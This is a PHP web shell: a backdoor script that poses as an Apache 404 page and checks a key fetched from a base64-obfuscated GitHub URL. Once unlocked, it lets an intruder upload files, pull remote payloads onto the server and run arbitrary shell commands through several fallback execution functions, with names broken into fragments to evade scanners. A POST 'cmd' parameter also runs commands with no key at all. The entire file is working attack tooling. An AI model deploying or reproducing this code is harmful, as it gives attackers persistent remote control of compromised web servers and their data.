<?php
function NotFound() {
    header("HTTP/1.0 404 Not Found");
    echo '<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html><head>
    <title>404 Not Found</title>
    </head><body>
    <h1>Not Found</h1>
    <p>The requested URL was not found on this server.</p>
    <hr>
    <address>'.$_SERVER["SERVER_SOFTWARE"].' ('.PHP_OS.') Server at '.$_SERVER["HTTP_HOST"].'</address>
    </body></html>
    ';
}
function CreateFile($fi_le_name, $fi_le_content) {
    if (function_exists('file_put_contents')) {
        $c_r_e_a_t_e_f_i_l_e_1 = file_put_contents($fi_le_name, $fi_le_content);
            if ($c_r_e_a_t_e_f_i_l_e_1 === false) {
                return false;
            } else {
                return true;
            }
    } elseif (function_exists('fopen')) {
        $c_r_e_a_t_e_f_i_l_e_2 = fopen($fi_le_name, 'w');
        if ($c_r_e_a_t_e_f_i_l_e_2 === false) {
            $c_r_e_a_t_e_f_i_l_e_1 = file_put_contents($fi_le_name, $fi_le_content);
            if ($c_r_e_a_t_e_f_i_l_e_1 === false) {
                return false;
            } else {
                return true;
            }
        } else {
            if (fwrite($c_r_e_a_t_e_f_i_l_e_2, $fi_le_content) === false) {
                fclose($c_r_e_a_t_e_f_i_l_e_2);
                return false;
            }
            fclose($c_r_e_a_t_e_f_i_l_e_2);
            return true;
        }
    } else {
        return false;
    }
}
function NuLzCmd($komendnya) {
    $hayoloh = 'h'.'tm'.'lspe'.'cialc'.'hars';
    $fw = 'f'.'wr'.'it'.'e';
    $fc = 'f'.'cl'.'os'.'e';
    $fr = 'f'.'re'.'a'.'d';
    $is_rsrc = 'is'.'_'.'re'.'so'.'ur'.'ce';
    $sgc = 's'.'trea'.'m_g'.'et_c'.'ont'.'ents';
    $proc = 'pr'.'oc'.'_'.'o'.'pen';
    $proc_cls = 'p'.'ro'.'c'.'_'.'c'.'lose';
    $pop = 'p'.'ope'.'n';
    $pop_cls = 'pc'.'lose';
    $exc = 'e'.'x'.'ec';
    $sys = 's'.'ys'.'t'.'em';
    $pass = 'pa'.'s'.'sth'.'ru';
    $sh_exc = 's'.'he'.'ll'.'_'.'e'.'xe'.'c';
    $com = 'C'.'O'.'M';
    $wscsh = 'WS'.'cr'.'ipt'.'.'.'S'.'he'.'ll';
    $cMdexe = 'c'.'md'.'.'.'e'.'x'.'e';
    $func_exist = 'fu'.'nct'.'ion'.'_'.'ex'.'ist'.'s';
    $preg = 'pr'.'eg_'.'mat'.'ch';
    $regex = '2'.'>'.'&'.'1';
    if ( !$preg( '/'.$regex.'/i', $komendnya ) ) {
        $komendnya = $komendnya.' '.$regex;
    }

    if ( $func_exist( $proc ) ) {
        $descriptors = [
            0 => [ 'pipe', 'r' ],
            1 => [ 'pipe', 'w' ],
            2 => [ 'pipe', 'w' ],
        ];
        $process = $proc( $komendnya, $descriptors, $pipes);
        if ( $is_rsrc( $process ) ) {
            $fw( $pipes[ 0 ], 'input_data_here' );
            $fc( $pipes[ 0 ] );
            $output = $sgc( $pipes[ 1 ] );
            $errors = $sgc( $pipes[ 2 ] );
            $fc( $pipes[ 1 ] );
            $fc( $pipes[ 2 ] );
            $resultCode = $proc_cls( $process );
            return trim($hayoloh(stripslashes($output)));
        }
    } elseif ( $func_exist( $pop ) ) {
        $process = $pop( $komendnya, 'r' );
        $read = $fr( $process, 2096 );
        return trim($hayoloh(stripslashes(print_r( "$process: ".gettype( $process )."\n$read \n" ))));
        $pop_cls( $process );
    } elseif ( $func_exist( $exc ) ) {
        $exc( $komendnya, $output, $returnCode );
        if ( $returnCode === 0 ) {
            $res = implode( $output );
            return trim($hayoloh(stripslashes($res)));
            ob_flush();
            flush();
        }
    } elseif ( $func_exist( $sys ) ) {
        $out = $sys( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $pass ) ) {
        $out = $pass( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $sh_exc ) ) {
        $out = $sh_exc( $komendnya );
        return trim($hayoloh(stripslashes($out)));
    } elseif ( $func_exist( $com ) ) {
        $shell = new $com($wscsh);
        $kom_mand = "$cMdexe /c ".$komendnya;
        $output = $shell->Exec($kom_mand)->StdOut->ReadAll();
        return trim($hayoloh(stripslashes($output)));
    }else {
        return "<b>The Function To Run The Command Is Disable On This Serever</b>";
    }
}
if (isset($_POST['cmd'])) {
    $komendnya = $_POST['cmd'];
    echo NuLzCmd($komendnya);
}
function ThisCWD(){
	if(function_exists('getcwd')){
		return @getcwd();
	}else{
		return dirname($_SERVER["SCRIPT_FILENAME"]);
	}
}
$path = ThisCWD();
$path = str_replace("\\", "/", $path);
$ganteng = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2hheG9yc3RhcnMvYXJjaGl2ZS9tYWluL251bHprZXkudHh0');
$nulzkey = file_get_contents($ganteng);
$key = sha1($nulzkey);
$param = isset($_GET['nulz']) ? $_GET['nulz'] : '';
if (empty($param)) {
    NotFound();
} else {
    $get_key = file_get_contents($param);
    if ($get_key !== false) {
        $sha1_key = sha1($get_key);
        if ($key === $sha1_key) {
            echo '<span style="white-space: nowrap;">Key: <pre style="display: inline;white-space: pre-wrap;">'.$sha1_key.'</pre> Valid</span>';
            echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
            echo '
            <form action="" method="POST" enctype="multipart/form-data">
                <label for="upload_path">Path:</label>
                <input type="text" style="width: 30vh;" name="upload_path" id="upload_path" value="'.$path.'"><br>
                <label for="file">(Auto Upload):</label>
                <input type="file" name="file[]" id="file" multiple><br>
                <button type="submit" name="uploads">Upload</button>
                ';
                if (isset($_POST['uploads'])) {
                    if (isset($_FILES["file"])) {
                        $countFiles = count($_FILES["file"]["name"]);
                        for ($i = 0; $i < $countFiles; $i++) {
                            $fi_le_Na_me = $_FILES["file"]["name"][$i];
                            $location = $_POST['upload_path']."/".$fi_le_Na_me;
                            $uploadFunction = "m"."ove" . "_up" . "loa"."ded_fi" . "le";
                            if ($uploadFunction($_FILES["file"]["tmp_name"][$i], $location)) {
                                echo "<span style='background: #222222; color: #00ff00; padding: 5px; border-radius: 10px;'>Upload Success</span>";
                            } else {
                                echo "<span style='background: #222222; color: #ff0000; padding: 5px; border-radius: 10px;'>Upload Failed</span>";
                            }
                        }
                    } else {
                        echo "<span style='color: #fcf803;'>Tidak Ada File Yang Di Upload</span>";
                    }
                }
            echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
            echo '
                <b>Remote Upload</b><br>
                <label for="fileurl">URL:</label>
                <input type="text" style="width: 30vh;" name="fileurl" id="fileurl" placeholder="https://nulz.edu.gov.ac.id/shell.txt"><br>
                <label for="savename">SAVE AS:</label>
                <input type="text" style="width: 30vh;" name="savename" id="savename" value="'.$path.'/saved.txt"><br>
                <button type="submit" name="remoteup">Save</button>
            ';
            if (isset($_POST['remoteup'])) {
                $fileurl = $_POST['fileurl'];
                $saveas = $_POST['savename'];
                $filecontent = file_get_contents($fileurl);
                if (CreateFile($saveas, $filecontent)) {
                    echo "<span style='background: #222222; color: #00ff00; padding: 5px; border-radius: 10px;'>Remote Upload Success</span>";
                } else {
                    echo "<span style='background: #222222; color: #ff0000; padding: 5px; border-radius: 10px;'>Remote Upload Failed</span>";
                }
            }
            echo '<pre>-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-</pre>';
            echo '
                <b>Commands</b><br>
                <label for="cmds">$</label>
                <input type="text" style="width: 40vh;" name="cmds" id="cmds" autofocus placeholder="ls -la"><br>
            ';
            echo '<textarea style="font-size: 10px; width: 40vh; height: 300px;">';
            if ($_SERVER["REQUEST_METHOD"] === "POST") {
                $komendnya = $_POST['cmds'];
                echo NuLzCmd($komendnya);
            }
            echo '</textarea>';
            echo '</form>';
        } else {
            NotFound();
        }
    } else {
        NotFound();
    }
}
